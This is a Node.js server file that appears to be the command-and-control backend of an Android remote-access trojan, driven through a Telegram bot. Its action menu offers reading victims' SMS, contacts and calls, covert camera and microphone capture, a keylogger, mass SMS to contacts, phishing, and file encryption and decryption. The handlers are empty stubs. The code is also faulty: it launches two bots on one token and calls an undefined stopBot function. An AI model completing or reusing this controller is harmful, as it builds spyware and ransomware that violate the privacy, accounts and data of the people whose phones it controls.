const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();
const data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));

let bot;
let isInitializing = false;

let botInstance = null;

const startBot = () => {
    if (!botInstance) {
        botInstance = new TelegramBot(data.token, { polling: true });

        botInstance.on('polling_error', (error) => {
            console.error(`Polling error: ${error.code} - ${error.message}`);
            if (error.code === 'ETELEGRAM' && error.response.body.error_code === 409) {
                console.log('Reinitializing bot after 409 Conflict error...');
                setTimeout(startBot, 5000); // Retry after 5 seconds
            }
        });

        botInstance.on('message', (msg) => {
            // Handle Telegram bot messages here
        });

        botInstance.on('ready', () => {
            console.log('Bot is ready');
        });
    }
};

startBot();

const initializeBot = () => {
    if (isInitializing) return;

    isInitializing = true;
    stopBot(() => {
        bot = new TelegramBot(data.token, { polling: true });

        bot.on('polling_error', (error) => {
            console.error(`Polling error: ${error.code} - ${error.message}`);
            if (error.code === 'ETELEGRAM' && error.response.body.error_code === 409) {
                console.log('Reinitializing bot after 409 Conflict error...');
                setTimeout(initializeBot, 5000); // Retry after 5 seconds
            }
        });

        bot.on('message', (msg) => {
            // Handle Telegram bot messages here
        });

        bot.on('ready', () => {
            isInitializing = false;
        });
    });
};

initializeBot();

const appData = new Map();
const actions = [
    '✯ SMS ✯',
    '✯ All Contacts ✯',
    '✯ Calls ✯',
    '✯ Apps ✯',
    '✯ Main Camera ✯',
    '✯ Selfie Camera ✯',
    '✯ Gallery ✯',
    '✯ File Explorer ✯',
    '✯ Microphone ✯',
    '✯ Play Audio ✯',
    '✯ Stop Audio ✯',
    '✯ Vibrate ✯',
    '✯ Toast ✯',
    '✯ Notification ✯',
    '✯ Clipboard ✯',
    '✯ Keylogger ON ✯',
    '✯ Keylogger OFF ✯',
    '✯ Open URL ✯',
    '✯ SMS to All Contacts ✯',
    '✯ Phishing ✯',
    '✯ Encrypt ✯',
    '✯ Decrypt ✯'
];

// Define a root route to handle the "Cannot GET /" issue
app.get('/', (req, res) => {
    res.send('Server is running');
});

// Define other necessary endpoints and handlers here

server.listen(data.PORT, () => {
    console.log(`Server running on port ${data.PORT}`);
});

io.on('connection', (socket) => {
    console.log('New connection established');
    // Define other socket event handlers here
});
